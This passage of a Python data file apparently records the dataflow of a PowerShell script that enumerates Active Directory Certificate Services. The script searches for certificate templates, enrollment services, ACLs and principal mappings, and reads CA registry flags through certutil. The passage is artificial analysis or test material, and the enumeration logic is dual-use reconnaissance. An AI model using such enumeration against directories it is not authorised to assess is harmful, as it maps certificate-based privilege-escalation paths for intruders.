    ],
    # input of _tryRead: _tryRead { $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey( "SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$caName") if ($key) { $key.GetValue('Security') } else { $null } }
    "_casecurityread::caname": [
        ("arg", "$name"),
        ("parameter", "[string]$caName"),
    ],
    # input of _tryRead: _tryRead { $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey( "SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$caName") if ($key) { $key.GetValue('Security') } else { $null } }
    "_casecurityread::key": [
        (
            "assign Equals",
            '[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey( "SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\$caName")',
        ),
    ],
    # input of _caSecurityFromBytes: _caSecurityFromBytes $r.value
    "_casecurityread::r": [
        (
            "assign Equals",
            "_tryRead { $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey( \"SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\$caName\") if ($key) { $key.GetValue('Security') } else { $null } }",
        ),
    ],
    # condition $c.Subject -eq $c.Issuer
    "_certkindfromder::c": [
        (
            "assign Equals",
            "New-Object Security.Cryptography.X509Certificates.X509Certificate2(,$der)",
        ),
    ],
    # input of New-Object: New-Object Security.Cryptography.X509Certificates.X509Certificate2(,$der)
    "_certkindfromder::der": [
        ("arg", "$der"),
        ("parameter", "[byte[]]$der"),
    ],
    # input of _certutilDwordFrom: _certutilDwordFrom $r.lines $r.code
    "_certutildword::r": [
        ("assign Equals", "_certutilRead $regpath"),
    ],
    # input of _certutilRead: _certutilRead $regpath
    "_certutildword::regpath": [
        ("arg", "'CA\\CAType'"),
        ("parameter", "[string]$regpath"),
    ],
    # input of _certutilStatus: _certutilStatus $lines $exitCode
    "_certutildwordfrom::exitcode": [
        ("arg", "$exitCode"),
        ("arg", "$r.code"),
        ("parameter", "$exitCode"),
    ],
    # input of _certutilStatus: _certutilStatus $lines $exitCode
    "_certutildwordfrom::lines": [
        ("arg", "$lines"),
        ("arg", "$r.lines"),
        ("parameter", "$lines"),
    ],
    # input of _certutilFlagsFrom: _certutilFlagsFrom $r.lines $r.code
    "_certutilflags::r": [
        ("assign Equals", "_certutilRead $regpath"),
    ],
    # input of _certutilRead: _certutilRead $regpath
    "_certutilflags::regpath": [
        ("arg", "'CA\\InterfaceFlags'"),
        ("arg", "'policy\\EditFlags'"),
        ("parameter", "[string]$regpath"),
    ],
    # input of _certutilStatus: _certutilStatus $lines $exitCode
    "_certutilflagsfrom::exitcode": [
        ("arg", "$r.code"),
        ("parameter", "$exitCode"),
    ],
    # input of _certutilStatus: _certutilStatus $lines $exitCode
    "_certutilflagsfrom::lines": [
        ("arg", "$r.lines"),
        ("parameter", "$lines"),
    ],
    # input of _certutilMultiSzFrom: _certutilMultiSzFrom $r.lines $r.code
    "_certutilmultisz::r": [
        ("assign Equals", "_certutilRead $regpath"),
    ],
    # input of _certutilRead: _certutilRead $regpath
    "_certutilmultisz::regpath": [
        ("arg", "'policy\\DisableExtensionList'"),
        ("parameter", "[string]$regpath"),
    ],
    # input of _certutilStatus: _certutilStatus $lines $exitCode
    "_certutilmultiszfrom::exitcode": [
        ("arg", "$r.code"),
        ("parameter", "$exitCode"),
    ],
    # input of _certutilStatus: _certutilStatus $lines $exitCode
    "_certutilmultiszfrom::lines": [
        ("arg", "$r.lines"),
        ("parameter", "$lines"),
    ],
    # condition $null -eq $values
    "_certutilmultiszfrom::values": [
        ("assign Equals", "_parseCertutilMultiSzLines $lines"),
    ],
    # parameter of _certutilStatus, called by a binding of $_certutilstringfrom::status
    "_certutilread::lines": [
        ("assign Equals", "@(& certutil -getreg $regpath 2>&1 | ForEach-Object { [string]$_ })"),
        ("assign Equals", "@([string]$_.Exception.Message)"),
    ],
    # input of certutil: & certutil -getreg $regpath 2>&1
    "_certutilread::regpath": [
        ("arg", "$regpath"),
        ("arg", "$regpath"),
        ("arg", "$regpath"),
        ("arg", "'CA\\AuditFilter'"),
        ("arg", "'CA\\CommonName'"),
        ("parameter", "[string]$regpath"),
    ],
    # condition $exitCode -eq 0
    "_certutilstatus::exitcode": [
        ("arg", "$exitCode"),
        ("arg", "$exitCode"),
        ("arg", "$exitCode"),
        ("arg", "$exitCode"),
        ("arg", "$exitCode"),
        ("parameter", "$exitCode"),
    ],
    # parameter of _certutilStatus, called by a binding of $_certutilstringfrom::status
    "_certutilstatus::lines": [
        ("arg", "$lines"),
        ("arg", "$lines"),
        ("arg", "$lines"),
        ("arg", "$lines"),
        ("arg", "$lines"),
        ("parameter", "$lines"),
    ],
    # condition $exitCode -eq 2 -or $exitCode -eq -2147024894 -or $text -match '0x80070002|ERROR_FILE_NOT_FOUND'
    "_certutilstatus::text": [
        ("assign Equals", '($lines | ForEach-Object { [string]$_ }) -join "`n"'),
    ],
    # input of _certutilStatus: _certutilStatus $lines $exitCode
    "_certutilstringfrom::exitcode": [
        ("arg", "$cnRead.code"),
        ("parameter", "$exitCode"),
    ],
    # input of _certutilStatus: _certutilStatus $lines $exitCode
    "_certutilstringfrom::lines": [
        ("arg", "$cnRead.lines"),
        ("parameter", "$lines"),
    ],
    # input of Where-Object: Where-Object { [string]$_ -match "$name REG_SZ = (.+)" }
    "_certutilstringfrom::name": [
        ("arg", "'CommonName'"),
        ("parameter", "[string]$name"),
    ],
    # condition $status -eq 'ok'
    "_certutilstringfrom::status": [
        ("assign Equals", "'failed'"),
        ("assign Equals", "_certutilStatus $lines $exitCode"),
    ],
    # condition -not $value
    "_certutilstringfrom::value": [
        ("assign Equals", "$null"),
        (
            "assign Equals",
            '($lines | Where-Object { [string]$_ -match "$name REG_SZ = (.+)" } | ForEach-Object { $Matches[1].Trim() } | Select-Object -First 1)',
        ),
    ],
    # input of _search: _search $containerDn $filter $attrs -Sd
    "_childacls::attrs": [
        ("assign Equals", "@('ntsecuritydescriptor', 'objectguid')"),
        ("assign PlusEquals", "'dnshostname'"),
    ],
    # input of _aclRow: _aclRow $p $kind $hostSid ([bool]$CaHost)
    "_childacls::cahost": [
        ("arg", "switch"),
        ("parameter", "[switch]$CaHost"),
    ],
    # input of _search: _search $containerDn $filter $attrs -Sd
    "_childacls::containerdn": [
        ("arg", '"CN=Certification Authorities,$pksDn"'),
        ("arg", '"CN=Enrollment Services,$pksDn"'),
        ("parameter", "[string]$containerDn"),
    ],
    # input of _entryProps: _entryProps $e
    "_childacls::e": [
        ("foreach", "$r.entries"),
    ],
    # parameter of _searchMarker, called by a binding of $<script>::enumeration
    "_childacls::failures": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", '"$kind`: $($_.Exception.Message)"'),
    ],
    # input of _search: _search $containerDn $filter $attrs -Sd
    "_childacls::filter": [
        ("arg", "'(objectClass=certificationAuthority)'"),
        ("arg", "'(objectClass=pKIEnrollmentService)'"),
        ("parameter", "[string]$filter"),
    ],
    # input of _aclRow: _aclRow $p $kind $hostSid ([bool]$CaHost)
    "_childacls::hostsid": [
        ("assign Equals", "''"),
        ("assign Equals", "_caHostSid @(_v $p 'dnshostname')"),
    ],
    # input of _aclRow: _aclRow $p $kind $hostSid ([bool]$CaHost)
    "_childacls::kind": [
        ("arg", "'ca_object'"),
        ("arg", "'ca_object'"),
        ("parameter", "[string]$kind"),
    ],
    # input of _requireSchema: _requireSchema $p 'pki-acls'
    "_childacls::p": [
        ("assign Equals", "_entryProps $e"),
    ],
    # condition $r.entries
    "_childacls::r": [
        ("assign Equals", "_search $containerDn $filter $attrs -Sd"),
    ],
    # condition $l -match 'mscep'
    "_classifyapp::l": [
        ("assign Equals", "$p.ToLower()"),
    ],
    # receiver of .ToLower()
    "_classifyapp::p": [
        ("arg", "$appPath"),
        ("parameter", "[string]$p"),
    ],
    # condition $value -band $e.Key
    "_decode::e": [
        ("foreach", "$map.GetEnumerator()"),
    ],
    # receiver of .GetEnumerator()
    "_decode::map": [
        ("arg", "$ENROLL_FLAGS"),
        ("arg", "$NAME_FLAGS"),
        ("arg", "$SCHANNEL_BITS"),
        ("parameter", "$map"),
    ],
    # condition $value -band $e.Key
    "_decode::value": [
        ("arg", "$ef"),
        ("arg", "$nf"),
        ("arg", "([int]$sch.uValue)"),
        ("parameter", "[int]$value"),
    ],
    # condition $v
    "_decodebinding::v": [
        ("arg", "([int]$kdc.uValue)"),
        ("parameter", "[int]$v"),
    ],
    # receiver of .GetValues()
    "_entryprops::attr": [
        ("assign Equals", "$entry.Attributes[[string]$n]"),
    ],
    # condition @($entry.Attributes.AttributeNames)
    "_entryprops::entry": [
        ("arg", "$e"),
        ("arg", "$e"),
        ("arg", "$e"),
        ("arg", "$e"),
        ("arg", "$e"),
        ("arg", "$e"),
        ("arg", "$e"),
        ("arg", "$e"),
        ("arg", "$e"),
        ("arg", "$r.entries[0]"),
        ("arg", "$r.entries[0]"),
        ("parameter", "$entry"),
    ],
    # condition $BINARY_ATTRS -contains $key
    "_entryprops::key": [
        ("assign Equals", "([string]$n).ToLower()"),
    ],
    # read by a binding of $_entryprops::key
    "_entryprops::n": [
        ("foreach", "@($entry.Attributes.AttributeNames)"),
    ],
    # index write $p[$key]
    "_entryprops::p": [
        ("assign Equals", "@{}"),
        ("index Equals", "$p[$key] = @($attr.GetValues([byte[]]))"),
        ("index Equals", "$p[$key] = @($attr.GetValues([string]))"),
        ("index Equals", "$p['distinguishedname'] = @([string]$entry.DistinguishedName)"),
    ],
    # condition [string]$v
    "_epatoken::v": [
        ("arg", "$tc.value.Value"),
        ("parameter", "$v"),
    ],
    # condition $b.Count -ne 16
    "_guidhex::b": [
        ("assign Equals", "[byte[]]$values[0]"),
    ],
    # condition -not $values -or $values.Count -lt 1
    "_guidhex::values": [
        ("arg", "@(_v $p 'objectguid')"),
        ("arg", "@(_v $p 'objectguid')"),
        ("arg", "@(_v $p 'objectguid')"),
        ("arg", "@(_v $p 'objectguid')"),
        ("arg", "@(_v $p 'objectguid')"),
        ("arg", "@(_v $p 'objectguid')"),
        ("arg", "@(_v $p 'objectguid')"),
        ("arg", "@(_v $p 'objectguid')"),
        ("parameter", "$values"),
    ],
    # receiver of .Bind()
    "_ldapconnection::conn": [
        ("assign Equals", "[System.DirectoryServices.Protocols.LdapConnection]::new($id)"),
        ("assign Equals", "[System.DirectoryServices.Protocols.LdapConnection]::new($id, $cred)"),
        (
            "member Equals",
            "$conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate",
        ),
        ("member Equals", "$conn.SessionOptions.ProtocolVersion = 3"),
    ],
    # argument of .new(): [System.DirectoryServices.Protocols.LdapConnection]::new($id, $cred)
    "_ldapconnection::cred": [
        ("assign Equals", "New-Object System.Net.NetworkCredential($LdapUser, $LdapPass)"),
    ],
    # argument of .new(): [System.DirectoryServices.Protocols.LdapConnection]::new($id, $cred)
    "_ldapconnection::id": [
        (
            "assign Equals",
            "[System.DirectoryServices.Protocols.LdapDirectoryIdentifier]::new($null)",
        ),
    ],
    # condition $script:LdapConn
    "_ldapconnection::ldapconn": [
        ("assign Equals", "$conn"),
    ],
    # parameter of _ldapEscape, called by a binding of $_cahostsid::r
    "_ldapescape::value": [
        ("arg", "$dns"),
        ("parameter", "[string]$value"),
    ],
    # condition $null -eq $value
    "_list::value": [
        ("arg", "$disabledExt"),
        ("arg", "$editFlags"),
        ("arg", "$interfaceFlags"),
        ("arg", "$provs"),
        ("arg", "$schannelMethods"),
        ("parameter", "$value"),
    ],
    # parameter of _localCaRow, called by a binding of $<script>::caconfig
    "_localcarow::enrollmentservice": [
        ("arg", "$false"),
        ("arg", "$true"),
        ("parameter", "[bool]$enrollmentService"),
    ],
    # parameter of _localCaRow, called by a binding of $<script>::caconfig
    "_localcarow::guid": [
        ("arg", "''"),
        ("arg", "(_guidHex @(_v $p 'objectguid'))"),
        ("parameter", "[string]$guid"),
    ],
    # index write $script:localSecurity[$name]
    "_localcarow::localsecurity": [
        ("index Equals", "$script:localSecurity[$name] = $sec.aces"),
    ],
    # input of _caSecurityRead: _caSecurityRead $name
    "_localcarow::name": [
        ("arg", "$caCommonName"),
        ("arg", "$cn"),
        ("parameter", "[string]$name"),
    ],
    # read by a binding of $_localcarow::localsecurity
    "_localcarow::sec": [
        ("assign Equals", "_caSecurityRead $name"),
    ],
    # condition -not $complete
    "_mark::complete": [
        ("parameter", "[bool]$complete"),
    ],
    # read by a binding of $_mark::enumeration
    "_mark::container": [
        ("parameter", "[string]$container"),
    ],
    # read by a binding of $_mark::m
    "_mark::count": [
        ("parameter", "[int]$count"),
    ],
    # index write $enumeration[$container]
    "_mark::enumeration": [
        ("index Equals", "$enumeration[$container] = $m"),
    ],
    # index write $m['reason']
    "_mark::m": [
        ("assign Equals", "[ordered]@{ complete = $complete; count = $count }"),
        ("index Equals", "$m['reason'] = $reason"),
    ],
    # read by a binding of $_mark::m
    "_mark::reason": [
        ("parameter", "[string]$reason"),
    ],
    # read by a binding of $_marksearch::enumeration
    "_marksearch::container": [
        ("arg", "'ca-config'"),
        ("arg", "'certs'"),
        ("arg", "'crls'"),
        ("arg", "'dc-config'"),
        ("arg", "'enrollment-services'"),
        ("arg", "'oid-objects'"),
        ("arg", "'pki-acls'"),
        ("arg", "'principal-mappings'"),
        ("arg", "'templates'"),
        ("parameter", "[string]$container"),
    ],
    # index write $enumeration[$container]
    "_marksearch::enumeration": [
        (
            "index Equals",
            "$enumeration[$container] = _searchMarker ([bool]$search.complete) ([string]$search.reason) $returned $written $failures $rows",
        ),
    ],
    # input of _searchMarker: _searchMarker ([bool]$search.complete) ([string]$search.reason) $returned $written $failures $rows
    "_marksearch::failures": [
        ("arg", "$aiaFailures"),
        ("arg", "$cdpFailures"),
        ("arg", "$dcFailures"),
        ("arg", "$esFailures"),
        ("arg", "$esFailures"),
        ("arg", "$osFailures"),
        ("arg", "$psFailures"),
        ("arg", "$tsFailures"),
        ("arg", "(@($caObjects.failures) + @($esObjects.failures))"),
        ("parameter", "[string[]]$failures"),
    ],
    # input of _searchMarker: _searchMarker ([bool]$search.complete) ([string]$search.reason) $returned $written $failures $rows
    "_marksearch::returned": [
        ("arg", "(6 + $caObjects.returned + $esObjects.returned)"),
        ("arg", "(@($es.entries).Count + $standalone)"),
        ("arg", "@($aia.entries).Count"),
        ("arg", "@($cdp.entries).Count"),
        ("arg", "@($dcs.entries).Count"),
        ("arg", "@($es.entries).Count"),
        ("arg", "@($os.entries).Count"),
        ("arg", "@($ps14.entries).Count"),
        ("arg", "@($ts.entries).Count"),
        ("parameter", "[int]$returned"),
    ],
    # input of _searchMarker: _searchMarker ([bool]$search.complete) ([string]$search.reason) $returned $written $failures $rows
    "_marksearch::rows": [
        ("arg", "$certIndex.Count"),
        ("arg", "$crlIndex.Count"),
        ("parameter", "[int]$rows = -1"),
    ],
    # input of _searchMarker: _searchMarker ([bool]$search.complete) ([string]$search.reason) $returned $written $failures $rows
    "_marksearch::search": [
        ("arg", "$aia"),
        ("arg", "$caSearch"),
        ("arg", "$cdp"),
        ("arg", "$dcs"),
        ("arg", "$es"),
        ("arg", "$os"),
        ("arg", "$pkiSearch"),
        ("arg", "$ps14"),
        ("arg", "$ts"),
        ("parameter", "$search"),
    ],
    # input of _searchMarker: _searchMarker ([bool]$search.complete) ([string]$search.reason) $returned $written $failures $rows
    "_marksearch::written": [
        ("arg", "$aiaObjects"),
        ("arg", "$caConfig.Count"),
        ("arg", "$cdpObjects"),
        ("arg", "$dcConfigs.Count"),
        ("arg", "$enrollmentServices.Count"),
        ("arg", "$oids.Count"),
        ("arg", "$pkiAcls.Count"),
        ("arg", "$principalMappings.Count"),
        ("arg", "$templates.Count"),
        ("parameter", "[int]$written"),
    ],
    # input of _search: _search $dn '(objectClass=*)' @('ntsecuritydescriptor', 'objectguid') -Scope Base -Sd
    "_objacl::dn": [
        ("arg", "$pair[0]"),
        ("parameter", "[string]$dn"),
    ],
    # input of _aclRow: _aclRow $p $kind '' $false
    "_objacl::kind": [
        ("arg", "$pair[1]"),
        ("parameter", "[string]$kind"),
    ],
    # input of _schemaCheck: _schemaCheck $p $OBJECT_SCHEMA.'pki-acls'
    "_objacl::p": [
        ("assign Equals", "_entryProps $r.entries[0]"),
    ],
    # input of _entryProps: _entryProps $r.entries[0]
    "_objacl::r": [
        (
            "assign Equals",
            "_search $dn '(objectClass=*)' @('ntsecuritydescriptor', 'objectguid') -Scope Base -Sd",
        ),
    ],
    # condition $first -match '^\d+(\.\d+)+$'
    "_oidvalues::first": [
        ("assign Equals", "([string]$v -split '\\s+', 2)[0]"),
    ],
    # read by a binding of $_oidvalues::first
    "_oidvalues::v": [
        ("foreach", "@($values)"),
    ],
    # condition $null -eq $values
    "_oidvalues::values": [
        ("arg", "(_certutilMultiSz 'policy\\DisableExtensionList')"),
        ("parameter", "$values"),
    ],
    # input of $send: & $send $cookie
    "_pagedsearchcore::cookie": [
        ("assign Equals", "@()"),
        ("assign Equals", "[byte[]]@($ctl.Cookie)"),
    ],
    # condition $null -eq $ctl
    "_pagedsearchcore::ctl": [
        (
            "assign Equals",
            "@($resp.Controls | Where-Object { $null -ne $_ -and $_.PSObject.Properties['Cookie'] }) | Select-Object -First 1",
        ),
    ],
    # argument of .Add(): $entries.Add($e)
    "_pagedsearchcore::e": [
        ("foreach", "@($resp.Entries)"),
    ],
    # receiver of .Add()
    "_pagedsearchcore::entries": [
        ("assign Equals", "New-Object System.Collections.ArrayList"),
    ],
    # condition $page -lt $maxPages
    "_pagedsearchcore::maxpages": [
        ("parameter", "[int]$maxPages = 100000"),
    ],
    # condition $page -lt $maxPages
    "_pagedsearchcore::page": [
        ("assign Equals", "0"),
        ("incdec PostfixPlusPlus", ""),
    ],
    # condition $null -eq $resp
    "_pagedsearchcore::resp": [
        ("assign Equals", "& $send $cookie"),
    ],
    # input of $send: & $send $cookie
    "_pagedsearchcore::send": [
        ("arg", "$send"),
        ("parameter", "[scriptblock]$send"),
    ],
    # receiver of .Translate()
    "_parseaces::a": [
        ("foreach", "$sd.GetAccessRules($true, $true, [Security.Principal.SecurityIdentifier])"),
    ],
    # condition $flag -eq 'ExtendedRight'
    "_parseaces::flag": [
        ("foreach", "($a.ActiveDirectoryRights.ToString() -split ',\\s*')"),
    ],
    # parameter of _safeFileName, called by a binding of $<script>::crlfile
    "_parseaces::name": [
        ("assign Equals", "''"),
        (
            "assign Equals",
            "[string]$a.IdentityReference.Translate([Security.Principal.NTAccount]).Value",
        ),
    ],
    # receiver of .ToLower()
    "_parseaces::ot": [
        ("assign Equals", "$a.ObjectType.ToString()"),
    ],
    # receiver of .SetSecurityDescriptorBinaryForm()
    "_parseaces::sd": [
        ("assign Equals", "New-Object DirectoryServices.ActiveDirectorySecurity"),
    ],
    # argument of .SetSecurityDescriptorBinaryForm(): $sd.SetSecurityDescriptorBinaryForm($sdBytes)
    "_parseaces::sdbytes": [
        ("arg", "([byte[]]$sdBytes)"),
        ("parameter", "[byte[]]$sdBytes"),
    ],
    # condition $line -match 'REG_DWORD\s*=\s*(?:0x)?([0-9a-fA-F]+)\b'
    "_parsecertutildwordlines::line": [
        ("foreach", "$lines"),
    ],
    # condition $lines
    "_parsecertutildwordlines::lines": [
        ("arg", "$lines"),
        ("arg", "$lines"),
        ("parameter", "$lines"),
    ],
    # condition $line -match '^\s+([A-Z][A-Z0-9_]+)\s+--\s'
    "_parsecertutilflaglines::line": [
        ("foreach", "$lines"),
    ],
    # condition $lines
    "_parsecertutilflaglines::lines": [
        ("arg", "$lines"),
        ("parameter", "$lines"),
    ],
    # condition $inMulti -or $done -or $line -notmatch 'REG_MULTI_SZ\s*=\s*$'
    "_parsecertutilmultiszlines::done": [
        ("assign Equals", "$false"),
        ("assign Equals", "$true"),
    ],
    # condition $inMulti -or $done -or $line -notmatch 'REG_MULTI_SZ\s*=\s*$'
    "_parsecertutilmultiszlines::inmulti": [
        ("assign Equals", "$false"),
        ("assign Equals", "$true"),
    ],
    # receiver of .Trim()
    "_parsecertutilmultiszlines::line": [
        ("assign Equals", "[string]$line"),
        ("foreach", "$lines"),
    ],
    # condition $lines
    "_parsecertutilmultiszlines::lines": [
        ("arg", "$lines"),
        ("parameter", "$lines"),
    ],
    # condition [int]$Matches[1] -ne $out.Count
    "_parsecertutilmultiszlines::out": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", "$Matches[2]"),
    ],
    # input of _caSecurityFromBytes: _caSecurityFromBytes $bytes
    "_rawsdowner::bytes": [
        ("parameter", "[byte[]]$bytes"),
    ],
    # condition $sec.owner
    "_rawsdowner::sec": [
        ("assign Equals", "_caSecurityFromBytes $bytes"),
    ],
    # receiver of .SetSecurityDescriptorBinaryForm()
    "_readowner::sd": [
        ("assign Equals", "New-Object DirectoryServices.ActiveDirectorySecurity"),
    ],
    # argument of .SetSecurityDescriptorBinaryForm(): $sd.SetSecurityDescriptorBinaryForm($sdBytes)
    "_readowner::sdbytes": [
        ("arg", "([byte[]]$sdBytes)"),
        ("parameter", "[byte[]]$sdBytes"),
    ],
    # condition $check.fatal
    "_requireschema::check": [
        ("assign Equals", "_schemaCheck $p $OBJECT_SCHEMA.$container"),
    ],
    # input of _schemaCheck: _schemaCheck $p $OBJECT_SCHEMA.$container
    "_requireschema::container": [
        ("arg", "'certs'"),
        ("arg", "'crls'"),
        ("arg", "'dc-config'"),
        ("arg", "'enrollment-services'"),
        ("arg", "'oid-objects'"),
        ("arg", "'pki-acls'"),
        ("arg", "'principal-mappings'"),
        ("arg", "'templates'"),
        ("parameter", "[string]$container"),
    ],
    # input of _schemaCheck: _schemaCheck $p $OBJECT_SCHEMA.$container
    "_requireschema::p": [
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("parameter", "$p"),
    ],
    # input of _v: _v $p 'configurationnamingcontext'
    "_rootdse::p": [
        ("assign Equals", "_entryProps $r.entries[0]"),
    ],
    # input of _entryProps: _entryProps $r.entries[0]
    "_rootdse::r": [
        (
            "assign Equals",
            "_search '' '(objectClass=*)' @('configurationNamingContext', 'defaultNamingContext') -Scope Base",
        ),
    ],
    # condition $script:RootDse
    "_rootdse::rootdse": [
        (
            "assign Equals",
            "@{ config = [string]@(_v $p 'configurationnamingcontext')[0] domain = [string]@(_v $p 'defaultnamingcontext')[0] }",
        ),
    ],
    # parameter of _safeFileName, called by a binding of $<script>::crlfile
    "_safefilename::name": [
        ("arg", "$cn"),
        ("arg", "$cn"),
        ("parameter", "[string]$name"),
    ],
    # input of _v: _v $p $attr
    "_schemacheck::attr": [
        ("assign Equals", "$prop.Name"),
    ],
    # argument of .TryParse(): [int]::TryParse($values[0], [ref]$n)
    "_schemacheck::n": [
        ("assign Equals", "0"),
        ("ref", "[int]::TryParse($values[0], [ref]$n)"),
    ],
    # input of _v: _v $p $attr
    "_schemacheck::p": [
        ("arg", "$p"),
        ("arg", "$p"),
        ("parameter", "$p"),
    ],
    # read by a binding of $_schemacheck::rule
    "_schemacheck::prop": [
        ("foreach", "$spec.PSObject.Properties"),
    ],
    # condition $rule.need -eq 'sd'
    "_schemacheck::rule": [
        ("assign Equals", "$prop.Value"),
    ],
    # condition $null -eq $spec
    "_schemacheck::spec": [
        ("arg", "$OBJECT_SCHEMA.$container"),
        ("arg", "$OBJECT_SCHEMA.'pki-acls'"),
        ("parameter", "$spec"),
    ],
    # receiver of .Trim()
    "_schemacheck::v": [
        ("foreach", "$values"),
        ("foreach", "$values"),
    ],
    # argument of .TryParse(): [int]::TryParse($values[0], [ref]$n)
    "_schemacheck::values": [
        ("assign Equals", "@(_v $p $attr)"),
    ],
    # condition $why
    "_schemacheck::why": [
        ("assign Equals", '"$attr has an empty or non-string value"'),
        ("assign Equals", '"$attr is empty or not a single string"'),
        ("assign Equals", '"$attr is not a 16-byte objectGUID"'),
        ("assign Equals", '"$attr is not a binary value"'),
        ("assign Equals", '"$attr is not an integer"'),
        ("assign Equals", '"$attr missing"'),
        ("assign Equals", '"$attr missing"'),
        ("assign Equals", "$null"),
    ],
    # condition -not $owner -or $null -eq $aces
    "_sdread::aces": [
        ("assign Equals", "$null"),
        ("assign Equals", "$null"),
        ("assign Equals", "_parseAces ([byte[]]$sdBytes)"),
    ],
    # condition -not $owner -or $null -eq $aces
    "_sdread::owner": [
        ("assign Equals", "$null"),
        ("assign Equals", "_readOwner ([byte[]]$sdBytes)"),
    ],
    # input of _parseAces: _parseAces ([byte[]]$sdBytes)
    "_sdread::sdbytes": [
        ("arg", "(@(_v $p 'ntsecuritydescriptor')[0])"),
        ("arg", "(@(_v $p 'ntsecuritydescriptor')[0])"),
        ("parameter", "$sdBytes"),
    ],
    # argument of .new(): [System.DirectoryServices.Protocols.SearchRequest]::new( $baseDn, $filter, [System.DirectoryServices.Protocols.SearchScope]$Scope, $attrs)
    "_search::attrs": [
        ("arg", "$attrs"),
        (
            "arg",
            "@( 'cn', 'displayname', 'objectguid', 'mspki-certificate-name-flag', 'mspki-enrollment-flag', 'pkiextendedkeyusage', 'mspki-certificate-policy', 'pkicsp', 'mspki-template-schema-version', 'mspki-cert-template-oid', 'mspki-minimal-key-size', 'ntsecuritydescriptor')",
        ),
        ("arg", "@('altsecurityidentities', 'objectguid')"),
        ("arg", "@('cn', 'cacertificate')"),
        ("arg", "@('cn', 'certificaterevocationlist', 'objectguid')"),
        ("arg", "@('cn', 'dnshostname', 'certificatetemplates', 'objectguid')"),
        ("arg", "@('configurationNamingContext', 'defaultNamingContext')"),
        ("arg", "@('dnshostname', 'objectguid')"),
        ("arg", "@('mspki-cert-template-oid', 'objectguid', 'displayname', 'msds-oidtogrouplink')"),
        ("arg", "@('ntsecuritydescriptor', 'objectguid')"),
        ("arg", "@('objectsid', 'dnshostname')"),
        ("parameter", "[string[]]$attrs"),
    ],
    # argument of .new(): [System.DirectoryServices.Protocols.SearchRequest]::new( $baseDn, $filter, [System.DirectoryServices.Protocols.SearchScope]$Scope, $attrs)
    "_search::basedn": [
        ("arg", '"CN=AIA,$pksDn"'),
        ("arg", '"CN=CDP,$pksDn"'),
        ("arg", '"CN=Certificate Templates,$pksDn"'),
        ("arg", '"CN=Enrollment Services,$pksDn"'),
        ("arg", '"CN=OID,$pksDn"'),
        ("arg", "$containerDn"),
        ("arg", "$dn"),
        ("arg", "$domNc"),
        ("arg", "$domNc"),
        ("arg", "''"),
        ("arg", "(_rootDse).domain"),
        ("parameter", "[string]$baseDn"),
    ],
    # receiver of .SendRequest()
    "_search::conn": [
        ("assign Equals", "_ldapConnection"),
    ],
    # condition $cookie -and $cookie.Length
    "_search::cookie": [
        ("parameter", "[byte[]]$cookie"),
    ],
    # argument of .new(): [System.DirectoryServices.Protocols.SearchRequest]::new( $baseDn, $filter, [System.DirectoryServices.Protocols.SearchScope]$Scope, $attrs)
    "_search::filter": [
        ("arg", '"(&(objectCategory=computer)(dNSHostName=$(_ldapEscape $dns)))"'),
        ("arg", "$filter"),
        ("arg", "'(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'"),
        ("arg", "'(altSecurityIdentities=*)'"),
        ("arg", "'(objectClass=*)'"),
        ("arg", "'(objectClass=*)'"),
        ("arg", "'(objectClass=cRLDistributionPoint)'"),
        ("arg", "'(objectClass=certificationAuthority)'"),
        ("arg", "'(objectClass=msPKI-Enterprise-Oid)'"),
        ("arg", "'(objectClass=pKICertificateTemplate)'"),
        ("arg", "'(objectClass=pKIEnrollmentService)'"),
        ("parameter", "[string]$filter"),
    ],
    # argument of .Add(): $req.Controls.Add($page)
    "_search::page": [
        (
            "assign Equals",
            "[System.DirectoryServices.Protocols.PageResultRequestControl]::new(500)",
        ),
        ("member Equals", "$page.Cookie = $cookie"),
    ],
    # input of SendRequest: $conn.SendRequest($req)
    "_search::req": [
        (
            "assign Equals",
            "[System.DirectoryServices.Protocols.SearchRequest]::new( $baseDn, $filter, [System.DirectoryServices.Protocols.SearchScope]$Scope, $attrs)",
        ),
    ],
    # argument of .new(): [System.DirectoryServices.Protocols.SearchRequest]::new( $baseDn, $filter, [System.DirectoryServices.Protocols.SearchScope]$Scope, $attrs)
    "_search::scope": [
        ("arg", "Base"),
        ("arg", "Base"),
        ("parameter", "[string]$Scope = 'Subtree'"),
    ],
    # condition $Sd
    "_search::sd": [
        ("arg", "switch"),
        ("arg", "switch"),
        ("arg", "switch"),
        ("parameter", "[switch]$Sd"),
    ],
    # input of _baseSearchCore: _baseSearchCore $send
    "_search::send": [
        (
            "assign Equals",
            "{ param([byte[]]$cookie) $req = [System.DirectoryServices.Protocols.SearchRequest]::new( $baseDn, $filter, [System.DirectoryServices.Protocols.SearchScope]$Scope, $attrs) if ($Scope -ne 'Base') { $page = [System.DirectoryServices.Protocols.PageResultRequestControl]::new(500) if ($cookie -and $cookie.Length) { $page.Cookie = $cookie } [void]$req.Controls.Add($page) } if ($Sd) { [void]$req.Controls.Add([System.DirectoryServices.Protocols.SecurityDescriptorFlagControl]::new( [System.DirectoryServices.Protocols.SecurityMasks]'Dacl,Owner')) } $conn.SendRequest($req) }.GetNewClosure()",
        ),
    ],
    # condition -not $complete
    "_searchmarker::complete": [
        ("assign Equals", "$searched -and $written -eq $returned -and $failures.Count -eq 0"),
    ],
    # read by a binding of $_searchmarker::why
    "_searchmarker::detail": [
        ("assign Equals", '"$written of $returned enumerated object(s) serialized"'),
        ("assign PlusEquals", "': ' + ($failures -join '; ')"),
    ],
    # condition $written -ne $returned -or $failures.Count
    "_searchmarker::failures": [
        ("arg", "$failures"),
        ("arg", "$iisFailures"),
        ("assign Equals", "@($failures | Where-Object { $_ })"),
        ("parameter", "[string[]]$failures"),
    ],
    # index write $m['reason']
    "_searchmarker::m": [
